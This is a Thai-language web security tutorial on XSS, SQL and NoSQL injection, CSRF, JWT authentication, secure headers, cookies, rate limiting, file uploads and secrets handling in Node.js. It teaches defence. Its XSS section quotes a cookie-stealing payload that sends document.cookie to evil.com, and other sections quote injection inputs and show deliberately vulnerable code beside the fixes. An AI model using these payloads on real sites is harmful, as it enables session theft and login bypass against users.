# Part 68: Security Best Practices (Steps 1331-1350)

## บทนำ: ทำไม Security ถึงสำคัญ

ความปลอดภัยในการพัฒนา web application เป็นเรื่องสำคัญมาก การถูกโจมตีอาจนำไปสู่:
- ข้อมูลผู้ใช้รั่วไหล
- ความเสียหายทางการเงิน
- ความเสียหายต่อชื่อเสียง
- ปัญหาทางกฎหมาย (PDPA, GDPR)

---

## Step 1331: OWASP Top 10 สำหรับ JavaScript

OWASP (Open Web Application Security Project) Top 10 คือรายการช่องโหว่ที่พบบ่อยที่สุด:

```
1. Broken Access Control
2. Cryptographic Failures
3. Injection (XSS, SQL Injection)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)
```

---

## Step 1332: XSS - Cross-Site Scripting

XSS คือการโจมตีที่ inject JavaScript code เข้าไปในเว็บ

### ประเภทของ XSS

```javascript
// 1. Reflected XSS - ส่งผ่าน URL
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// 2. Stored XSS - บันทึกลง database แล้ว render ให้ users อื่น
// ผู้โจมตีบันทึก: <script>document.location='https://evil.com?cookie='+document.cookie</script>

// 3. DOM-based XSS - เกิดจาก client-side JS
// ❌ ช่องโหว่
const userInput = location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;
// URL: example.com#<img src=x onerror=alert('XSS')>
```

### การป้องกัน XSS

```javascript
// ===== วิธีที่ 1: ใช้ textContent แทน innerHTML =====

// ❌ ช่องโหว่
function showUserName(name) {
  document.getElementById('username').innerHTML = name; // XSS!
}

// ✅ ปลอดภัย
function showUserName(name) {
  document.getElementById('username').textContent = name; // Safe
}

// ===== วิธีที่ 2: Output Encoding =====

function escapeHTML(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

function escapeForAttribute(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/\//g, '&#x2F;');
}

// ✅ ปลอดภัย - escape ก่อน render
function renderComment(comment) {
  return `
    <div class="comment">
      <span class="author">${escapeHTML(comment.author)}</span>
      <p>${escapeHTML(comment.text)}</p>
    </div>
  `;
}

// ===== วิธีที่ 3: DOMPurify =====
// npm install dompurify

import DOMPurify from 'dompurify';

// Sanitize HTML ที่ต้องการ allow HTML (เช่น rich text editor)
function renderRichText(html) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'class'],
    ALLOW_DATA_ATTR: false,
    // ลบ dangerous protocols
    FORBID_ATTR: ['style', 'onerror', 'onload'],
  });
  
  document.getElementById('content').innerHTML = clean;
}

// ✅ ใช้ DOMPurify ก่อน set innerHTML เสมอ
const userComment = '<p>ข้อความดีๆ <script>alert("xss")</script></p>';
const safeHTML = DOMPurify.sanitize(userComment);
document.getElementById('comment').innerHTML = safeHTML;
// ผลลัพธ์: <p>ข้อความดีๆ </p> (script ถูกลบ)

// ===== วิธีที่ 4: Content Security Policy (CSP) =====
// กำหนดใน HTTP headers หรือ meta tag

// HTTP Header (แนะนำ)
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline';

// Meta tag (ใช้เมื่อเข้าไม่ถึง server)
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">

// Node.js Express ด้วย Helmet
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-${generateNonce()}'"],
    styleSrc: ["'self'", "https://fonts.googleapis.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"], // ป้องกัน clickjacking
    upgradeInsecureRequests: [],
  },
}));

// CSP Nonce - สำหรับ inline scripts ที่ต้องการ
function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

// ใน template
app.get('/', (req, res) => {
  const nonce = generateNonce();
  res.locals.nonce = nonce;
  
  // Set CSP header กับ nonce
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}'`
  );
  
  res.render('index', { nonce });
});

// ใน HTML template
// <script nonce="<%= nonce %>">
//   // script นี้ได้รับอนุญาต
// </script>
```

---

## Step 1333: SQL Injection Prevention

```javascript
// ===== SQL Injection =====

// ❌ ช่องโหว่ - string concatenation
async function findUserBad(username) {
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  // ถ้า username = "admin' --"
  // Query: SELECT * FROM users WHERE username = 'admin' --'
  // ผู้โจมตี login ได้โดยไม่ต้องรู้รหัสผ่าน!
  return db.query(query);
}

// ✅ ปลอดภัย - Parameterized Queries
async function findUserGood(username) {
  // ใช้ placeholder (?)
  const query = 'SELECT * FROM users WHERE username = ?';
  return db.query(query, [username]);
}

// ===== ตัวอย่างกับ MySQL2 =====
import mysql from 'mysql2/promise';

const db = await mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
});

// ✅ Parameterized Query
async function getUserById(id) {
  const [rows] = await db.execute(
    'SELECT id, username, email FROM users WHERE id = ?',
    [id]
  );
  return rows[0];
}

// ✅ Complex query
async function searchProducts(filters) {
  const params = [];
  let conditions = [];
  
  if (filters.category) {
    conditions.push('category = ?');
    params.push(filters.category);
  }
  
  if (filters.minPrice) {
    conditions.push('price >= ?');
    params.push(filters.minPrice);
  }
  
  if (filters.maxPrice) {
    conditions.push('price <= ?');
    params.push(filters.maxPrice);
  }
  
  const whereClause = conditions.length > 0 
    ? 'WHERE ' + conditions.join(' AND ')
    : '';
  
  const [rows] = await db.execute(
    `SELECT * FROM products ${whereClause} LIMIT ? OFFSET ?`,
    [...params, filters.limit || 20, filters.offset || 0]
  );
  
  return rows;
}

// ===== ด้วย Knex.js (Query Builder) =====
import knex from 'knex';

const db = knex({
  client: 'mysql2',
  connection: {
    host: process.env.DB_HOST,
    database: process.env.DB_NAME,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
  },
});

// ✅ Knex จัดการ parameterization อัตโนมัติ
async function getUser(id) {
  return db('users')
    .where({ id })
    .select('id', 'username', 'email')
    .first();
}

async function createUser(userData) {
  const [id] = await db('users').insert({
    username: userData.username,
    email: userData.email,
    password_hash: await hashPassword(userData.password),
    created_at: new Date(),
  });
  return id;
}

// ===== ด้วย Prisma ORM =====
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

// ✅ Prisma ปลอดภัยจาก SQL injection
async function searchUsers(searchTerm) {
  return prisma.user.findMany({
    where: {
      OR: [
        { username: { contains: searchTerm } },
        { email: { contains: searchTerm } },
      ],
    },
    select: {
      id: true,
      username: true,
      email: true,
    },
  });
}
```

---

## Step 1334: NoSQL Injection Prevention

```javascript
// ===== MongoDB/NoSQL Injection =====

// ❌ ช่องโหว่
async function loginBad(req, res) {
  const { username, password } = req.body;
  
  // ถ้า username = { $gt: "" }, password = { $gt: "" }
  // ผู้โจมตี login ได้โดยไม่ต้องรู้ username/password
  const user = await User.findOne({
    username: username,    // ❌ ไม่ validate
    password: password,    // ❌ ไม่ validate
  });
}

// ✅ ปลอดภัย - Validate และ sanitize input
import { sanitize } from 'mongo-sanitize';
import Joi from 'joi';

const loginSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  password: Joi.string().min(8).required(),
});

async function loginGood(req, res) {
  // Validate types
  const { error, value } = loginSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // Sanitize - ลบ MongoDB operators ($, .)
  const { username, password } = sanitize(value);
  
  // ตรวจสอบว่าเป็น string เสมอ
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  const user = await User.findOne({ username }).select('+password');
  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  res.json({ token: generateToken(user) });
}

// ===== Express-mongo-sanitize =====
import mongoSanitize from 'express-mongo-sanitize';

// Sanitize ทุก request อัตโนมัติ
app.use(mongoSanitize({
  replaceWith: '_',  // แทนที่ $ ด้วย _
  allowDots: false,  // ไม่อนุญาต dots
}));

// ===== Mongoose Query Sanitization =====
// ใช้ strict mode ใน Schema
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  email: { type: String, required: true },
  password: { type: String, required: true, select: false },
}, {
  strict: true,      // ไม่ยอมรับ fields ที่ไม่ได้กำหนด
  strictQuery: true, // strict mode สำหรับ queries
});
```

---

## Step 1335: CSRF Protection

```javascript
// ===== CSRF (Cross-Site Request Forgery) =====
// ผู้โจมตีหลอกให้ browser ส่ง request ไปยัง site ที่ victim login อยู่

// ===== วิธีป้องกัน 1: CSRF Token =====
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Generate token สำหรับ form
app.get('/checkout', (req, res) => {
  res.render('checkout', {
    csrfToken: req.csrfToken(),
  });
});

// Form ใน HTML:
// <form method="POST" action="/checkout">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   ...
// </form>

// สำหรับ AJAX requests
// Frontend ต้องส่ง CSRF token ใน header
const token = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/checkout', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': token,  // ส่ง token ใน header
  },
  body: JSON.stringify(orderData),
});

// ===== วิธีป้องกัน 2: SameSite Cookies =====
// ป้องกัน cookies ถูกส่งจาก cross-site requests

res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // Strict: ไม่ส่ง cookie เมื่อมาจาก cross-site
  // หรือ 'lax': ส่งเมื่อ top-level navigation เท่านั้น
  // หรือ 'none': ส่งเสมอ (ต้องใช้ secure: true)
});

// ===== วิธีป้องกัน 3: Double Submit Cookie Pattern =====
// ไม่ต้องใช้ session-based CSRF token

function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

app.get('/', (req, res) => {
  const token = generateCSRFToken();
  
  // ส่ง token เป็น cookie
  res.cookie('csrf-token', token, {
    httpOnly: false, // client ต้องอ่านได้
    secure: true,
    sameSite: 'strict',
  });
  
  res.render('index', { csrfToken: token });
});

// Middleware ตรวจสอบ
function verifyCSRF(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }
  
  const tokenFromCookie = req.cookies['csrf-token'];
  const tokenFromHeader = req.headers['x-csrf-token'];
  
  if (!tokenFromCookie || tokenFromCookie !== tokenFromHeader) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  
  next();
}

app.use(verifyCSRF);
```

---

## Step 1336: Authentication Security

```javascript
// ===== Secure Password Handling =====
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12; // งาน work factor สูง = ปลอดภัยกว่าแต่ช้ากว่า

// Hash password
async function hashPassword(plainPassword) {
  return bcrypt.hash(plainPassword, SALT_ROUNDS);
}

// Verify password
async function verifyPassword(plainPassword, hashedPassword) {
  return bcrypt.compare(plainPassword, hashedPassword);
}

// ❌ ไม่ดี: MD5, SHA1 (เร็วเกินไป = brute force ง่าย)
// ❌ ไม่ดี: ไม่ใช้ salt
// ✅ ดี: bcrypt, argon2, scrypt

// ===== JWT Secure Implementation =====
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET; // ต้องยาวและสุ่ม
const JWT_EXPIRES_IN = '15m'; // Access token อายุสั้น
const JWT_REFRESH_EXPIRES_IN = '7d';

function generateAccessToken(userId) {
  return jwt.sign(
    { userId, type: 'access' },
    JWT_SECRET,
    {
      expiresIn: JWT_EXPIRES_IN,
      algorithm: 'HS256',
      issuer: 'my-app',
      audience: 'my-app-users',
    }
  );
}

function generateRefreshToken(userId) {
  return jwt.sign(
    { userId, type: 'refresh' },
    JWT_REFRESH_SECRET, // ใช้ secret แยก
    { expiresIn: JWT_REFRESH_EXPIRES_IN }
  );
}

function verifyToken(token, type = 'access') {
  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      issuer: 'my-app',
      audience: 'my-app-users',
    });
    
    if (decoded.type !== type) {
      throw new Error('Wrong token type');
    }
    
    return decoded;
  } catch (error) {
    throw new Error('Invalid token');
  }
}

// Middleware ตรวจสอบ JWT
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.substring(7);
  
  try {
    const decoded = verifyToken(token);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// ===== Token Blacklisting (สำหรับ logout) =====
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

async function blacklistToken(token, expiresIn) {
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  
  if (ttl > 0) {
    await redis.setex(`blacklist:${token}`, ttl, '1');
  }
}

async function isTokenBlacklisted(token) {
  const result = await redis.get(`blacklist:${token}`);
  return result !== null;
}

// ===== Multi-Factor Authentication (MFA) =====
import speakeasy from 'speakeasy';
import qrcode from 'qrcode';

// สร้าง secret สำหรับ MFA
function generateMFASecret(userEmail) {
  const secret = speakeasy.generateSecret({
    name: `MyApp (${userEmail})`,
    length: 20,
  });
  
  return secret;
}

// สร้าง QR Code สำหรับ Google Authenticator
async function getMFAQRCode(secret) {
  return qrcode.toDataURL(secret.otpauth_url);
}

// ตรวจสอบ OTP
function verifyMFAToken(secret, token) {
  return speakeasy.totp.verify({
    secret: secret.base32,
    encoding: 'base32',
    token,
    window: 1, // อนุญาต 1 ช่วงเวลา (30 วินาที) ก่อน/หลัง
  });
}
```

---

## Step 1337: Secure Headers ด้วย Helmet.js

```javascript
// npm install helmet
import helmet from 'helmet';
import express from 'express';

const app = express();

// ===== ใช้ Helmet ทั้งหมด =====
app.use(helmet());

// ===== หรือปรับแต่งเอง =====
app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
  
  // HTTP Strict Transport Security
  // บังคับใช้ HTTPS เป็นเวลา 1 ปี
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  
  // ป้องกัน clickjacking
  frameguard: { action: 'deny' },
  
  // ซ่อน X-Powered-By header
  hidePoweredBy: true,
  
  // ป้องกัน MIME type sniffing
  noSniff: true,
  
  // XSS Filter (สำหรับ old browsers)
  xssFilter: true,
  
  // ป้องกัน DNS prefetch
  dnsPrefetchControl: { allow: false },
  
  // Referrer Policy
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// ===== Headers ที่สำคัญ =====
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 1; mode=block
// Strict-Transport-Security: max-age=31536000; includeSubDomains
// Content-Security-Policy: default-src 'self'
// Referrer-Policy: strict-origin-when-cross-origin
// Permissions-Policy: camera=(), microphone=(), geolocation=()

// เพิ่ม Permissions Policy
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 
    'camera=(), microphone=(), geolocation=(), payment=(self)'
  );
  next();
});
```

---

## Step 1338: HTTPS และ Secure Cookies

```javascript
// ===== Force HTTPS =====
import express from 'express';

const app = express();

// Redirect HTTP → HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https' && process.env.NODE_ENV === 'production') {
    res.redirect(`https://${req.header('host')}${req.url}`);
    return;
  }
  next();
});

// ===== Secure Cookies =====
import session from 'express-session';
import RedisStore from 'connect-redis';

app.use(session({
  store: new RedisStore({ client: redis }),
  secret: process.env.SESSION_SECRET,
  name: '__Host-sessionId', // __Host- prefix = more secure
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,       // ป้องกัน JavaScript access
    secure: true,         // เฉพาะ HTTPS
    sameSite: 'strict',   // ป้องกัน CSRF
    maxAge: 1000 * 60 * 60 * 24, // 1 วัน
    path: '/',
    domain: '.example.com',
  },
}));

// ===== Cookie Prefix =====
// __Secure- prefix: ต้อง secure=true
// __Host- prefix: ต้อง secure=true, path='/', ไม่มี domain

// ✅ ปลอดภัยที่สุด
res.cookie('__Host-token', value, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict',
  path: '/',
  // ไม่มี domain attribute
});

// ===== Signed Cookies =====
import cookieParser from 'cookie-parser';

app.use(cookieParser(process.env.COOKIE_SECRET));

// ตั้งค่า signed cookie
res.cookie('userId', '12345', { signed: true });

// อ่าน signed cookie
const userId = req.signedCookies.userId;
// ถ้า cookie ถูกแก้ไข จะได้ false

// ===== Encrypt Cookie Value =====
import crypto from 'crypto';

function encryptCookieValue(value) {
  const key = crypto.scryptSync(process.env.COOKIE_SECRET, 'salt', 32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  
  let encrypted = cipher.update(value, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag().toString('hex');
  
  return `${iv.toString('hex')}.${encrypted}.${authTag}`;
}

function decryptCookieValue(encryptedValue) {
  const [ivHex, encrypted, authTagHex] = encryptedValue.split('.');
  
  const key = crypto.scryptSync(process.env.COOKIE_SECRET, 'salt', 32);
  const iv = Buffer.from(ivHex, 'hex');
  const authTag = Buffer.from(authTagHex, 'hex');
  
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(authTag);
  
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}
```

---

## Step 1339: Rate Limiting

```javascript
// npm install express-rate-limit
import rateLimit from 'express-rate-limit';
import slowDown from 'express-slow-down';

// ===== Basic Rate Limiting =====
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 นาที
  max: 100, // สูงสุด 100 requests ต่อ IP
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    status: 429,
    message: 'มี requests มากเกินไป กรุณารอสักครู่',
    retryAfter: 900, // วินาที
  },
});

app.use('/api/', globalLimiter);

// ===== Strict Limit สำหรับ Auth endpoints =====
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // สูงสุด 5 login attempts ต่อ 15 นาที
  skipSuccessfulRequests: true,
  message: {
    status: 429,
    message: 'พยายาม login มากเกินไป กรุณารอ 15 นาที',
  },
  // Custom key generator (รวม IP + username)
  keyGenerator: (req) => {
    const ip = req.ip;
    const username = req.body?.username || '';
    return `${ip}:${username}`;
  },
  // Handler เมื่อ limit
  handler: (req, res) => {
    console.warn(`Rate limit hit: ${req.ip} - ${req.body?.username}`);
    res.status(429).json({
      message: 'Too many login attempts',
      retryAfter: Math.ceil(req.rateLimit.resetTime / 1000 - Date.now() / 1000),
    });
  },
});

app.post('/api/auth/login', authLimiter, loginHandler);
app.post('/api/auth/register', authLimiter, registerHandler);
app.post('/api/auth/forgot-password', authLimiter, forgotPasswordHandler);

// ===== Speed Limiting (ช้าลงแทนการ block) =====
const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 5, // เริ่ม slow down หลัง 5 requests
  delayMs: (hits) => hits * 500, // เพิ่ม delay ทุกครั้ง
  maxDelayMs: 20000, // delay สูงสุด 20 วินาที
});

app.use('/api/', speedLimiter);

// ===== Redis-based Rate Limiting (distributed) =====
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

const distributedLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 30,
  store: new RedisStore({
    sendCommand: (...args) => redis.call(...args),
  }),
});

// ===== IP Blocking =====
const blockedIPs = new Set();
const suspiciousActivity = new Map();

function trackSuspiciousActivity(ip) {
  const count = (suspiciousActivity.get(ip) || 0) + 1;
  suspiciousActivity.set(ip, count);
  
  if (count > 100) {
    blockedIPs.add(ip);
    console.warn(`Blocked IP: ${ip} after ${count} suspicious requests`);
  }
}

app.use((req, res, next) => {
  const clientIP = req.ip || req.connection.remoteAddress;
  
  if (blockedIPs.has(clientIP)) {
    return res.status(403).json({ message: 'Forbidden' });
  }
  
  next();
});
```

---

## Step 1340: Input Validation

```javascript
// ===== ใช้ Joi สำหรับ Input Validation =====
import Joi from 'joi';

// Schema definitions
const schemas = {
  user: {
    register: Joi.object({
      username: Joi.string()
        .alphanum()
        .min(3)
        .max(30)
        .required()
        .messages({
          'string.alphanum': 'ชื่อผู้ใช้ต้องเป็นตัวอักษรและตัวเลขเท่านั้น',
          'string.min': 'ชื่อผู้ใช้ต้องมีอย่างน้อย {#limit} ตัวอักษร',
          'any.required': 'กรุณากรอกชื่อผู้ใช้',
        }),
      
      email: Joi.string()
        .email({ tlds: { allow: false } })
        .lowercase()
        .required(),
      
      password: Joi.string()
        .min(8)
        .max(128)
        .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
        .required()
        .messages({
          'string.pattern.base': 'รหัสผ่านต้องมีตัวพิมพ์เล็ก ตัวพิมพ์ใหญ่ ตัวเลข และอักขระพิเศษ',
        }),
      
      confirmPassword: Joi.string()
        .valid(Joi.ref('password'))
        .required()
        .messages({ 'any.only': 'รหัสผ่านไม่ตรงกัน' }),
      
      age: Joi.number().integer().min(13).max(120).required(),
      
      phone: Joi.string()
        .pattern(/^0[6-9]\d{8}$/)
        .optional()
        .messages({ 'string.pattern.base': 'เบอร์โทรไม่ถูกต้อง' }),
    }),
    
    login: Joi.object({
      email: Joi.string().email().required(),
      password: Joi.string().required(),
    }),
    
    updateProfile: Joi.object({
      username: Joi.string().alphanum().min(3).max(30),
      bio: Joi.string().max(500).allow(''),
      website: Joi.string().uri().allow(''),
    }).min(1), // ต้องมี field อย่างน้อย 1 field
  },
  
  product: {
    create: Joi.object({
      name: Joi.string().trim().min(1).max(200).required(),
      price: Joi.number().positive().precision(2).required(),
      stock: Joi.number().integer().min(0).required(),
      category: Joi.string().valid('electronics', 'clothing', 'food', 'books').required(),
      description: Joi.string().max(5000).allow(''),
      images: Joi.array().items(Joi.string().uri()).max(10),
    }),
  },
};

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,   // แสดง errors ทั้งหมด
      stripUnknown: true,  // ลบ fields ที่ไม่ได้กำหนด
      convert: true,       // แปลง types อัตโนมัติ
    });
    
    if (error) {
      const errors = error.details.map(detail => ({
        field: detail.path.join('.'),
        message: detail.message,
      }));
      
      return res.status(400).json({ errors });
    }
    
    req.validatedBody = value; // ใช้ validated value แทน req.body
    next();
  };
}

// ใช้งาน
app.post('/api/auth/register',
  validate(schemas.user.register),
  async (req, res) => {
    const { username, email, password } = req.validatedBody;
    // ข้อมูลผ่าน validation แล้ว
    await createUser({ username, email, password });
    res.status(201).json({ message: 'สมัครสมาชิกสำเร็จ' });
  }
);

// ===== ด้วย Zod (TypeScript-first) =====
import { z } from 'zod';

const productSchema = z.object({
  name: z.string().min(1).max(200),
  price: z.number().positive(),
  category: z.enum(['electronics', 'clothing', 'food']),
  tags: z.array(z.string()).max(10).optional(),
});

type Product = z.infer<typeof productSchema>;

function validateProduct(data: unknown): Product {
  return productSchema.parse(data); // throw ถ้า invalid
  // หรือ productSchema.safeParse(data) → { success, data, error }
}
```

---

## Step 1341: File Upload Security

```javascript
// ===== Secure File Upload =====
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import sharp from 'sharp'; // Image processing

// ===== Validation =====
const ALLOWED_MIMETYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/gif',
  'image/webp',
]);

const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

// ===== Multer Configuration =====
const storage = multer.memoryStorage(); // ไม่บันทึกลง disk โดยตรง

const upload = multer({
  storage,
  limits: {
    fileSize: MAX_FILE_SIZE,
    files: 5, // สูงสุด 5 ไฟล์
  },
  fileFilter: (req, file, callback) => {
    // ตรวจสอบ MIME type
    if (!ALLOWED_MIMETYPES.has(file.mimetype)) {
      return callback(new Error('ประเภทไฟล์ไม่ได้รับอนุญาต'));
    }
    
    // ตรวจสอบ extension
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];
    const ext = path.extname(file.originalname).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return callback(new Error('นามสกุลไฟล์ไม่ได้รับอนุญาต'));
    }
    
    callback(null, true);
  },
});

// ===== Secure File Processing =====
async function processUploadedImage(file) {
  // 1. ตรวจสอบ magic bytes (file signature)
  const isValidImage = await validateImageMagicBytes(file.buffer);
  if (!isValidImage) {
    throw new Error('ไฟล์ไม่ใช่รูปภาพที่ถูกต้อง');
  }
  
  // 2. สร้างชื่อไฟล์ใหม่ (ไม่ใช้ชื่อเดิม)
  const uniqueId = crypto.randomBytes(16).toString('hex');
  const ext = '.webp'; // แปลงเป็น WebP เสมอ
  const filename = `${uniqueId}${ext}`;
  
  // 3. Process image ด้วย Sharp (ลบ EXIF data ที่อาจมี sensitive info)
  const processedBuffer = await sharp(file.buffer)
    .resize(1920, 1920, {
      fit: 'inside',
      withoutEnlargement: true,
    })
    .webp({ quality: 85 })
    .withMetadata(false) // ลบ EXIF data ทั้งหมด
    .toBuffer();
  
  // 4. บันทึกในที่ที่ไม่ accessible โดยตรงจาก web
  const uploadPath = path.join(process.env.UPLOAD_DIR, filename);
  // process.env.UPLOAD_DIR ต้องอยู่นอก public directory!
  
  await fs.writeFile(uploadPath, processedBuffer);
  
  return {
    filename,
    size: processedBuffer.length,
    url: `/api/images/${filename}`, // serve ผ่าน API ที่มี auth check
  };
}

async function validateImageMagicBytes(buffer) {
  // ตรวจสอบ magic bytes ของแต่ละประเภทไฟล์
  const magicBytes = {
    jpeg: [0xFF, 0xD8, 0xFF],
    png: [0x89, 0x50, 0x4E, 0x47],
    gif: [0x47, 0x49, 0x46],
    webp: [0x52, 0x49, 0x46, 0x46], // RIFF
  };
  
  const fileStart = [...buffer.slice(0, 4)];
  
  return Object.values(magicBytes).some(magic =>
    magic.every((byte, i) => fileStart[i] === byte)
  );
}

// Route
app.post('/api/upload', authenticate, upload.single('image'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'ไม่มีไฟล์ที่อัพโหลด' });
    }
    
    const result = await processUploadedImage(req.file);
    res.json({ url: result.url, filename: result.filename });
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Serve images ผ่าน API (ตรวจสอบ auth)
app.get('/api/images/:filename', authenticate, async (req, res) => {
  const { filename } = req.params;
  
  // Validate filename (ป้องกัน path traversal)
  if (!/^[a-f0-9]{32}\.(webp|jpg|png)$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  const filepath = path.join(process.env.UPLOAD_DIR, filename);
  
  // ตรวจสอบ path ไม่หลุดออกนอก UPLOAD_DIR
  if (!filepath.startsWith(process.env.UPLOAD_DIR)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.sendFile(filepath);
});
```

---

## Step 1342: Environment Variables Security

```javascript
// ===== อย่า commit secrets! =====
// .gitignore ต้องมี:
// .env
// .env.local
// .env.*.local
// secrets/

// ===== .env structure =====
// .env.example (commit ได้ - แค่ template)
// DATABASE_URL=postgresql://user:password@localhost:5432/mydb
// JWT_SECRET=your-secret-here
// STRIPE_SECRET_KEY=sk_test_...

// ===== Validate Environment Variables =====
import { z } from 'zod';

const envSchema = z.object({
  // Database
  DATABASE_URL: z.string().url(),
  
  // JWT
  JWT_SECRET: z.string().min(32),
  JWT_REFRESH_SECRET: z.string().min(32),
  
  // Session
  SESSION_SECRET: z.string().min(32),
  COOKIE_SECRET: z.string().min(32),
  
  // Redis
  REDIS_URL: z.string().url(),
  
  // AWS
  AWS_ACCESS_KEY_ID: z.string().optional(),
  AWS_SECRET_ACCESS_KEY: z.string().optional(),
  AWS_REGION: z.string().optional(),
  
  // App
  NODE_ENV: z.enum(['development', 'production', 'test']),
  PORT: z.string().transform(Number).default('3000'),
  
  // CORS
  ALLOWED_ORIGINS: z.string().transform(s => s.split(',')),
});

// Validate ตอน startup
let env: z.infer<typeof envSchema>;

try {
  env = envSchema.parse(process.env);
  console.log('✅ Environment variables validated');
} catch (error) {
  console.error('❌ Invalid environment variables:', error.errors);
  process.exit(1); // หยุด server ถ้า env ไม่ถูกต้อง
}

export { env };

// ===== ไม่เปิดเผย env ใน error messages =====

// ❌ ช่องโหว่
app.get('/debug', (req, res) => {
  res.json({ env: process.env }); // เปิดเผย secrets!
});

// ✅ ปลอดภัย - เฉพาะ development
app.get('/debug', (req, res) => {
  if (process.env.NODE_ENV !== 'development') {
    return res.status(404).send('Not Found');
  }
  
  // แสดงเฉพาะ safe variables
  res.json({
    NODE_ENV: process.env.NODE_ENV,
    PORT: process.env.PORT,
    // ไม่แสดง secrets!
  });
});

// ===== Secrets Management =====
// ใน production ใช้:
// - AWS Secrets Manager
// - HashiCorp Vault
// - Azure Key Vault
// - Google Secret Manager

// ตัวอย่างด้วย AWS Secrets Manager
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

